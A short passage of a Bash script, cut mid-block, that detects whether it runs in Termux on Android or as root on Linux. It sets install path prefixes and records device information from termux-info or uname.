termux=true
if [[ $nN == "Y" ]];then
Device=$(termux-info)
fi
PREFIX='/data/data/com.termux/files/usr/'
SYS='/sdcard/'
elif [[ -d /root/ ]];then
termux=false
PREFIX='/'
SYS='/'
Device=$(uname -a)
